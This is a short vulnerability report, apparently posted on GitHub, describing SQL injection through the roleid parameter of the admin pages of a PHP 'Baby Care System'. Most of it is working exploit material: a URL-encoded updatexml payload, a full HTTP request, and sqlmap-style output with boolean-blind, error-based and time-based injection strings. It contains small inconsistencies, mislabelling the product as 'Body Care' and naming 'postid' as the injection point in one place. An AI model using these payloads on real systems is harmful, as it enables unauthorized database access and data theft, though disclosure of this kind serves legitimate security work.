## Body Care System has SQL injection vulnerability

vendor: https://www.sourcecodester.com/php/14622/baby-care-system-phpmysqli-full-source-code.html

Vulnerability file: /BabyCare/admin/pagerole.php&action=display&value=1&roleid=

![image](https://user-images.githubusercontent.com/54017627/161251996-d95f8774-84ca-4523-9014-8338db680c44.png)

Vulnerability location: /BabyCare/admin.php?id=pagerole&action=display&value=1&roleid= //postid is Injection point

[+]Payload:  /BabyCare/admin.php?id=pagerole&action=display&value=1&roleid=3%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),2)--+ //roleid is Injection point

```sql
GET /BabyCare/admin.php?id=pagerole&action=display&value=1&roleid=3%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),2)--+ HTTP/1.1
Host: 192.168.1.19
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=v8g2iaa0tsnt5b01btt83eb7qo
Connection: close
```
![image](https://user-images.githubusercontent.com/54017627/161251808-c5216072-b958-4275-b435-c147b9c6856d.png)

```sql
---
Parameter: roleid (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: id=pagerole&action=display&value=1&roleid=3' RLIKE (SELECT (CASE WHEN (6967=6967) THEN 3 ELSE 0x28 END))-- nhxC

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=pagerole&action=display&value=1&roleid=3' AND (SELECT 2190 FROM(SELECT COUNT(*),CONCAT(0x7162627871,(SELECT (ELT(2190=2190,1))),0x717a766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Gllb

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=pagerole&action=display&value=1&roleid=3' AND (SELECT 4825 FROM (SELECT(SLEEP(5)))FSej)-- xCer
---
```

![image](https://user-images.githubusercontent.com/54017627/161251755-89513aae-c605-46a8-a71c-1ec190a79c04.png)

